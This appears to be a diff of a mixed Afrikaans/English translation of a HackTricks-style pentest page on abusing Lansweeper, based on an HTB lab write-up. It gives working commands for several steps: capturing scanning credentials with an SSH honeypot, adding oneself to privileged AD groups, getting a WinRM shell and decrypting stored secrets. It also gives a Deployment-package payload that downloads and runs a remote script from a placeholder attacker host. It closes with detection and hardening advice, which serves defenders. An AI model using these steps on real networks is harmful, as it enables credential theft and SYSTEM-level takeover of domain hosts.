@@ -1,30 +1,30 @@
-# Lansweeper Misbruik: Credential Harvesting, Secrets Decryption, and Deployment RCE
+# Lansweeper Misbruik: Kredensiaal-insameling, Secrets-dekripsie, en Deployment RCE
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Lansweeper is 'n IT asset discovery en inventory platform wat algemeen op Windows gedeploy word en met Active Directory geïntegreer is. Credentials wat in Lansweeper gekonfigureer is, word deur sy scanning engines gebruik om by assets te authentiseer oor protokolle soos SSH, SMB/WMI en WinRM. Misconfigurasies laat dikwels toe:
+Lansweeper is 'n IT-bates-ontdekking en inventarisplatform wat algemeen op Windows ontplooi word en met Active Directory geïntegreer is. Kredensiale wat in Lansweeper gekonfigureer is, word deur sy skandeer-enjins gebruik om te verifieer by stelsels oor protokolle soos SSH, SMB/WMI en WinRM. Verkeerde konfigurasies laat dikwels toe:
 
-- Credential interception deur 'n scanning target na 'n aanvaller-beheerde gasheer (honeypot) te herlei
-- Abuse of AD ACLs wat deur Lansweeper-related groups blootgestel word om remote toegang te kry
-- On-host decryption van Lansweeper-configured secrets (connection strings en stored scanning credentials)
-- Code execution op managed endpoints via die Deployment feature (dikwels lopend as SYSTEM)
+- Kredensiaalafluistering deur 'n skandeer-doelwit na 'n aanvaller-beheerde gasheer te herlei (honeypot)
+- Misbruik van AD ACLs wat deur Lansweeper-verwante groepe blootgestel word om afstandstoegang te verkry
+- Dekripsie op die gasheer van Lansweeper-gekonfigureerde secrets (connection strings en gestoor skandeer-kredensiale)
+- Kode-uitvoering op bestuurde eindpunte via die Deployment-funksie (gereeld as SYSTEM)
 
-Hierdie bladsy som praktiese aanvaller-werkvloei en opdragte op om hierdie gedrag tydens engagements te misbruik.
+Hierdie bladsy som praktiese aanval-werkvloei en opdragte op om hierdie gedrag tydens engagements te misbruik.
 
 ## 1) Harvest scanning credentials via honeypot (SSH example)
 
-Idee: skep 'n Scanning Target wat na jou gasheer wys en koppel bestaande Scanning Credentials daaraan. Wanneer die scan loop, sal Lansweeper probeer om met daardie credentials te authentiseer, en jou honeypot sal dit vasvang.
+Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.
 
-Stappe oorsig (web UI):
+Steps overview (web UI):
 - Scanning → Scanning Targets → Add Scanning Target
-- Tipe: IP Range (or Single IP) = jou VPN IP
-- Konfigureer die SSH-poort na iets bereikbaar (bv. 2022 as 22 geblokkeer is)
-- Deaktiveer die schedule en beplan om dit handmatig te trigger
-- Scanning → Scanning Credentials → verseker dat Linux/SSH creds bestaan; koppel dit aan die nuwe target (enable all as needed)
-- Klik “Scan now” op die target
-- Run an SSH honeypot en vang die gepoogde gebruikersnaam/wagwoord op
+- Type: IP Range (or Single IP) = your VPN IP
+- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
+- Disable schedule and plan to trigger manually
+- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
+- Click “Scan now” on the target
+- Run an SSH honeypot and retrieve the attempted username/password
 
-Example with sshesame:
+Voorbeeld met sshesame:
 ```yaml
 # sshesame.conf
 server:
@@ -39,7 +39,7 @@ sshesame --config sshesame.conf
 # authentication for user "svc_inventory_lnx" with password "<password>" accepted
 # connection with client version "SSH-2.0-RebexSSH_5.0.x" established
 ```
-Valideer vasgevangde creds teen DC-dienste:
+Valideer captured creds teen DC-dienste:
 ```bash
 # SMB/LDAP/WinRM checks (NetExec)
 netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
@@ -47,12 +47,12 @@ netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
 Aantekeninge
-- Werk soortgelyk vir ander protokolle wanneer jy die scanner na jou luisteraar kan dwing (SMB/WinRM honeypots, ens.). SSH is dikwels die eenvoudigste.
-- Baie scanners identifiseer hulself met onderskeibare client banners (bv. RebexSSH) en sal onskadelike opdragte (uname, whoami, ens.) probeer.
+- Werk soortgelyk vir ander protokolle wanneer jy die scanner na jou listener kan dwing (SMB/WinRM honeypots, ens.). SSH is dikwels die eenvoudigste.
+- Baie scanners identifiseer hulself met kenmerkende kliëntbanners (bv. RebexSSH) en sal benigne opdragte probeer (uname, whoami, ens.).
 
-## 2) AD ACL abuse: kry afstandstoegang deur jouself by 'n app-admin group te voeg
+## 2) AD ACL abuse: verkry afstandstoegang deur jouself by 'n app-admin group te voeg
 
-Gebruik BloodHound om die effektiewe regte van die gekompromitteerde rekening te enumereer. 'n Algemene bevinding is 'n scanner- of app-specific group (bv. “Lansweeper Discovery”) wat GenericAll het oor 'n bevoorregte groep (bv. “Lansweeper Admins”). As die bevoorregte groep ook lid is van “Remote Management Users”, word WinRM beskikbaar sodra ons onsself byvoeg.
+Gebruik BloodHound om die effektiewe regte van die gekompromiteerde rekening op te som. 'n Algemene bevinding is 'n scanner- of app-spesifieke groep (bv. “Lansweeper Discovery”) wat GenericAll oor 'n bevoorregte groep (bv. “Lansweeper Admins”) het. As die bevoorregte groep ook lid is van “Remote Management Users”, word WinRM beskikbaar sodra ons onsself byvoeg.
 
 Versamelvoorbeelde:
 ```bash
@@ -71,24 +71,24 @@ add groupMember "Lansweeper Admins" svc_inventory_lnx
 # Confirm WinRM access if the group grants it
 netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Kry dan 'n interactive shell:
+Kry dan 'n interaktiewe shell:
 ```bash
 evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
 ```
-Wenk: Kerberos-operasies is tydsensitief. As jy KRB_AP_ERR_SKEW kry, sinkroniseer eers met die DC:
+Wenk: Kerberos-operasies is tydsgevoelig. As jy KRB_AP_ERR_SKEW kry, sinkroniseer eers met die DC:
 ```bash
 sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
 ```
 ## 3) Ontsleutel Lansweeper-gekonfigureerde geheime op die gasheer
 
-Op die Lansweeper-bediener stoor die ASP.NET-webwerf gewoonlik 'n geënkripteerde connection string en 'n symmetriesleutel wat deur die toepassing gebruik word. Met toepaslike plaaslike toegang kan jy die DB connection string ontsleutel en dan die gestoorde scanning credentials ekstraheer.
+Op die Lansweeper-bediener stoor die ASP.NET-site gewoonlik 'n versleutelde connection string en 'n simmetriese sleutel wat deur die toepassing gebruik word. Met toepaslike plaaslike toegang kan jy die DB connection string ontsleutel en dan die gestoor scanning credentials uittrek.
 
-Tipiese liggings:
-- Web-config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
+Tipiese plekke:
+- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
 - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
 - Toepassingsleutel: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`
 
-Gebruik SharpLansweeperDecrypt om ontcijfering en dumping van gestoorde creds te outomatiseer:
+Gebruik SharpLansweeperDecrypt om ontsleuteling en die dump van gestoor creds te outomatiseer:
 ```powershell
 # From a WinRM session or interactive shell on the Lansweeper host
 # PowerShell variant
@@ -99,7 +99,7 @@ powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
 #  - Connect to Lansweeper DB
 #  - Decrypt stored scanning credentials and print them in cleartext
 ```
-Die verwagte uitset sluit DB-verbindingbesonderhede en plaintext-skanderings-inlogbewyse in, soos Windows- en Linux-rekeninge wat oor die omgewing gebruik word. Hierdie rekeninge het dikwels verhoogde plaaslike regte op domein-gashere:
+Verwagte uitvoer sluit DB connection details en plaintext scanning credentials in, soos Windows- en Linux-rekeninge wat oor die hele omgewing gebruik word. Hierdie rekeninge het dikwels verhoogde plaaslike regte op domain hosts:
 ```text
 Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
 Inventory Linux    svc_inventory_lnx        <StrongPassword!>
@@ -111,14 +111,14 @@ netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
 ```
 ## 4) Lansweeper Deployment → SYSTEM RCE
 
-As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Execution is performed by the Lansweeper service with high privilege, yielding code execution as NT AUTHORITY\SYSTEM on the selected host.
+As 'n lid van “Lansweeper Admins” openbaar die web UI Deployment en Configuration. Onder Deployment → Deployment packages kan jy pakkette skep wat arbitrêre opdragte op geteikende assets uitvoer. Die uitvoering word deur die Lansweeper service met hoë voorregte uitgevoer, wat kode-uitvoering as NT AUTHORITY\SYSTEM op die gekose gasheer lewer.
 
-Hoëvlak stappe:
-- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
-- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
-- Catch your shell as SYSTEM.
+High-level steps:
+- Skep 'n nuwe Deployment package wat 'n PowerShell of cmd one-liner uitvoer (reverse shell, add-user, ens.).
+- Teiken die gewenste asset (bv. die DC/host waar Lansweeper loop) en klik Deploy/Run now.
+- Kry jou shell as SYSTEM.
 
-Voorbeeld payloads (PowerShell):
+Example payloads (PowerShell):
 ```powershell
 # Simple test
 powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
@@ -127,21 +127,21 @@ powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"
 powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
 ```
 OPSEC
-- Ontplooiingsaksies is luidrugtig en laat logs in Lansweeper en in die Windows event logs. Gebruik dit versigtig.
+- Ontplooiingsaksies is lawaaierig en laat logs in Lansweeper en Windows event logs. Gebruik dit spaarsaam.
 
 ## Opsporing en verharding
 
-- Beperk of verwyder anonieme SMB-enumerasies. Monitor vir RID-cycling en abnormale toegang tot Lansweeper shares.
-- Egress-controles: blokkeer of beperk streng uitgaande SSH/SMB/WinRM vanaf scanner-hosts. Waarsku op nie-standaard poorte (bv. 2022) en ongewone kliëntbanners soos Rebex.
-- Beskerm `Website\\web.config` en `Key\\Encryption.txt`. Externaliseer secrets in 'n vault en roteer dit by blootstelling. Oorweeg service accounts met minimale bevoegdhede en gMSA waar toepaslik.
-- AD-monitoring: waarsku op veranderinge aan Lansweeper-related groups (bv. “Lansweeper Admins”, “Remote Management Users”) en op ACL-wysigings wat GenericAll/Write-lidmaatskap op bevoorregte groepe toeken.
-- Ouudit die skepping/wysiging/uitvoering van Deployment-pakkette; waarsku op pakkette wat cmd.exe/powershell.exe spawn of onverwagte uitgaande verbindings.
+- Beperk of verwyder anonieme SMB-enumerasies. Moniteer vir RID cycling en abnormale toegang tot Lansweeper-shares.
+- Egress-beheer: blokkeer of beperk streng uitgaande SSH/SMB/WinRM vanaf scanner-hosts. Waarsku op nie-standaard poorte (bv. 2022) en ongewone kliënt-banners soos Rebex.
+- Beskerm `Website\\web.config` en `Key\\Encryption.txt`. Externaliseer secrets in 'n vault en roteer by blootstelling. Oorweeg diensrekeninge met minimale regte en gMSA waar toepaslik.
+- AD-monitering: waarsku oor veranderinge aan Lansweeper-verwante groepe (bv. “Lansweeper Admins”, “Remote Management Users”) en oor ACL-wijzigings wat GenericAll/Write-lidmaatskap aan bevoorregte groepe verleen.
+- Oudit ontplooiingspakket-skeppings/wysigings/uitvoerings; waarsku as pakkette cmd.exe/powershell.exe begin of onverwagte uitgaande verbindings maak.
 
 ## Verwante onderwerpe
-- SMB/LSA/SAMR enumeration and RID cycling
-- Kerberos password spraying and clock skew considerations
-- BloodHound path analysis of application-admin groups
-- WinRM usage and lateral movement
+- SMB/LSA/SAMR enumerasie en RID cycling
+- Kerberos password spraying en klokskewe-oorwegings
+- BloodHound padontleding van application-admin-groepe
+- WinRM-gebruik en lateral movement
 
 ## Verwysings
 - [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
